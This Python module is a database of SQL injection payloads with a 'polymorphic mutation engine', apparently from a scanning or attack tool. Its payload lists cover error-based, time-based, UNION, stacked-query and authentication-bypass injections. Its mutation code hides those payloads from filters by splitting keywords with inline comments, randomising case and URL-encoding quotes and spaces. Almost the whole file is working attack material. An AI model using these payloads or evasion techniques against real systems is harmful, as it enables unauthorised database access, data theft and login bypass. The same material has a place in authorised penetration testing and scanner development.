"""Payload database with polymorphic mutation engine."""

import random
from collections import defaultdict

PAYLOAD_TEMPLATES = {
    "syntax_probe": [
        "'", "\"", "')", "'))", "\'", "%27", "%22",
        "1'", "1\"", "1')",
        "`", "``", ",", "/", "//", "\\", "\\\\", ";", "%00",
    ],
    "boolean_true": [
        "' OR 1=1 -- ", "' OR 'a'='a' -- ", "admin' OR '1'='1' -- ",
        "\" OR 1=1 -- ", "' AND 1=1 -- ", "admin' -- ",
        "' UNION SELECT 1,1,1 WHERE 1=1 -- ",
        "1 OR 1=1 -- ", "1) OR (1=1 -- ", "' OR 2>1 -- ", "' OR TRUE -- ",
        "' HAVING 1=1 -- ",
        "%' AND 1=1 AND '%'='",
        "' AND RLIKE (SELECT CASE WHEN (1=1) THEN 0x61646d696e ELSE 0x28 END) AND 'a'='a",
        "admin\" OR \"1\"=\"1",
        "admin\") OR (\"1\"=\"1",
        "' OR ''='",
    ],
    "boolean_false": [
        "' OR 1=2 -- ", "' AND 1=2 -- ", "1 OR 1=2 -- ", "1) OR (1=2 -- ",
        "' HAVING 1=0 -- ",
        "%' AND 1=0 AND '%'='",
    ],
    "error_based": [
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) -- ",
        "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1) -- ",
        "1' AND 1=CONVERT(INT, (SELECT @@VERSION)) -- ",
        "1' OR 1/@@VERSION -- ",
        "' OR CAST((SELECT VERSION()) AS NUMERIC) -- ",
        "' AND 1=CAST((SELECT sqlite_version()) AS INT) -- ",
        "' AND load_extension('nonexistent') -- ",
        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT VERSION()), 0x7e, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) -- ",
    ],
    "time_based": [
        "' OR SLEEP(5) -- ", "' AND SLEEP(5) -- ",
        "' OR (SELECT SLEEP(5)) -- ",
        "1' OR pg_sleep(5) -- ",
        "1'; WAITFOR DELAY '0:0:5' -- ",
        "1' OR WAITFOR DELAY '0:0:5' -- ",
        "1' AND BENCHMARK(5000000,MD5('test')) -- ",
        "1' OR (SELECT dbms_lock.sleep(5) FROM dual) -- ",
        "' AND (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) -- ",
        "1' AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) -- ",
        "1' OR LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) -- ",
        ",(SELECT * FROM (SELECT(SLEEP(5)))a)",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
        "'+BENCHMARK(5000000,SHA1(1))+'",
    ],
    "union_probe": [
        "' UNION SELECT NULL -- ",
        "' UNION SELECT NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
        "' UNION SELECT 1,2,3 -- ",
        "' UNION SELECT VERSION(),2,3 -- ",
        "' UNION SELECT @@VERSION,2,3 -- ",
        "1' ORDER BY 1 -- ", "1' ORDER BY 100 -- ",
        "' UNION SELECT SUM(1) FROM INFORMATION_SCHEMA.TABLES -- ",
    ],
    "stacked_query": [
        "1'; SELECT SLEEP(3) -- ",
        "1'; WAITFOR DELAY '0:0:3' -- ",
        "1'; SELECT pg_sleep(3) -- ",
    ],
    "header_injection": [
        "' OR SLEEP(3) -- ", "' OR 1=1 -- ",
        "' UNION SELECT NULL -- ",
    ],
    "auth_bypass": [
        "admin\" -- ",
        "' or ''-'",
        "' or '' '",
        "\" or \"\"-\"",
        "1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    ],
}

COMMENT_CHUNKS = ["/**/", "/*!*/", "/*!12345*/", "/*!99999*/", "/*+-*/"]
WHITESPACE = ["%09", "%0a", "%0d", "\t", "  "]

def mutate_payload(payload: str, complexity: int = 2) -> str:
    result = payload
    if complexity >= 1:
        keywords = [
            "SELECT", "UNION", "OR", "AND", "WHERE", "FROM",
            "SLEEP", "BENCHMARK", "EXTRACTVALUE", "UPDATEXML",
            "CONVERT", "WAITFOR", "DELAY", "PG_SLEEP",
            "DBMS_LOCK", "DBMS_PIPE"
        ]
        for kw in keywords:
            idx = result.upper().find(kw.upper())
            if idx >= 0 and len(kw) >= 2:
                pos = idx + random.randint(1, len(kw) - 1)
                result = result[:pos] + random.choice(COMMENT_CHUNKS) + result[pos:]
                if random.random() < 0.3:
                    break
    if complexity >= 2:
        chars = list(result)
        for i in range(len(chars)):
            if chars[i].isalpha() and random.random() < 0.35:
                chars[i] = chars[i].swapcase()
        result = "".join(chars)
    if complexity >= 1 and random.random() < 0.4:
        result = result.replace("'", random.choice(["%27", "%2527", "\'"]))
    if complexity >= 1 and random.random() < 0.4:
        if " " in result:
            result = result.replace(" ", random.choice(WHITESPACE), 1)
    return result

def generate_payloads() -> list:
    payloads = []
    seen = set()
    for category, templates in PAYLOAD_TEMPLATES.items():
        for template in templates:
            payloads.append({"value": template, "category": category})
            for _ in range(2):
                mutated = mutate_payload(template, random.randint(2, 3))
                if mutated != template and mutated not in seen:
                    seen.add(mutated)
                    payloads.append({"value": mutated, "category": category})
    random.shuffle(payloads)
    return payloads

ALL_PAYLOADS = generate_payloads()
